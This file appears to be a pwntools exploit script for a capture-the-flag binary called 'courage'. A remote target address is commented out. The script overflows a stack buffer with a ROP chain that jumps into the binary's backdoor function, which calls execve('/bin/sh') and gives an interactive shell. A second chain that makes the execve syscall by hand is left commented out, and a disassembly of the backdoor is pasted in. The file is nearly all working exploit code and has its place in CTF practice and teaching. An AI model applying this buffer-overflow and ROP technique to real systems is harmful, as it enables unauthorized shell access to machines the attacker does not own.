from pwn import *

# r = remote('10.10.10.246', 30159)
r = process(r'./courage')
context.log_level = 'debug'

backdoor_addr = 0x4019E2

# execve_addr = 0x419730
execve_addr = 0x419734
main_addr = 0x401955
sh_addr = 0x47F045
pop_rdi_rbp = 0x4021c8
pop_rax = 0x42171b
pop_rsi_rbp = 0x405152
syscall = 0x401A08
ret = 0x40101a

# gdb.attach(r)

'''
.text:00000000004019E2
.text:00000000004019E2                 public backdoor
.text:00000000004019E2 backdoor        proc near
.text:00000000004019E2 ; __unwind {
.text:00000000004019E2                 endbr64
.text:00000000004019E6                 push    rbp
.text:00000000004019E7                 mov     rbp, rsp
.text:00000000004019EA                 lea     rax, aCourage0  ; "COURAGE=0"
.text:00000000004019F1                 mov     rdx, rax
.text:00000000004019F4                 lea     rax, aCDEFGD    ; "-c -d -e -f -g -d"
.text:00000000004019FB                 mov     rsi, rax
.text:00000000004019FE                 lea     rax, aBinSh     ; "/bin/sh"
.text:0000000000401A05                 mov     rdi, rax
.text:0000000000401A08                 call    execve
.text:0000000000401A0D                 nop
.text:0000000000401A0E                 pop     rbp
.text:0000000000401A0F                 retn
.text:0000000000401A0F ; } // starts at 4019E2
.text:0000000000401A0F backdoor        endp
'''
# 设置rsi为0 然后直接ret2text到4019fe
payload = b'A' * (0x20+8) + p64(pop_rsi_rbp) + p64(0) + p64(0xaaaaafff) + p64(0x4019FE)
# 手动构造 execve 函数
# payload = b'A' * (0x20+8) + p64(pop_rdi_rbp) + p64(sh_addr) + p64(0) + p64(pop_rsi_rbp) + p64(0) + p64(0) + p64(pop_rax) + p64(0x3b) + p64(syscall)

r.sendlineafter(b'courage:', payload)
r.interactive()
